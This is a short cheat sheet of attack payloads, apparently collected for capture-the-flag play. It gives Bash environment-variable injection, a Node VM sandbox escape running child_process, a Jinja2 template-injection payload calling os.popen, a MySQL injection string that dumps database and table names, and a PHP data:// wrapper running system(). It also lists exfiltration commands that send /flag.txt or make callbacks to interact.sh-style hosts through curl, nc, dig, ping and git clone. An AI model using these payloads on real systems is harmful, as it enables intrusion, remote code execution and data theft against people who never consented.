# magic_strings
Handy bits for CTFs and life

### Bash 

#### ENV Vars
    BASH_ENV='$(id 1>&2)' bash -c 'echo hello'

    env $'BASH_FUNC_myfunc%%=() { id; }' bash -c 'myfunc'

#### Encoding

    $'\151\144'

### NodeJS

#### Node VM

Escape Node VM Sandbox

    this.constructor.constructor("return this.process")().mainModule.require("child_process").execSync("id").toString()

### Python

#### Jinja2 / Template Injection

    {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

### MySQL 

MySQL >=5.6

    concat(0x404f73616e64614d616c6974680a, @@innodb_version ,0x0a,user(),0x0a, schema(), (select (@x) from (select (@x:=0x00), (@number:=0),(select (0) from (mysql.innodb_table_stats) where (@x:=concat(@x,0x0a,lpad(@number:=@number+1,2,0),0x2e20,database_name, 0x202d3e20 ,table_name,0x202d3e20 ,length(table_name)))))x))

### PHP

    data://data:text/plain,<?php system("id")?>

### Exfiltrate

    curl -T /flag.txt xxxx.interct.sh
    ping here.xxx.interact.sh
    nc nchere.xxx.interact.sh 80
    dig dighere.xxx.interact.sh
    git clone githere.xxx.interact.sh
    

## Resources

- [Payloads All The Things]( https://github.com/swisskyrepo/PayloadsAllTheThings/ )
- [Reverse Shells Generator]( https://www.revshells.com/ )
- [De Obfuscate JS]( https://lelinhtinh.github.io/de4js/ )
- [XSS Cheat sheet]( https://portswigger.net/web-security/cross-site-scripting/cheat-sheet )
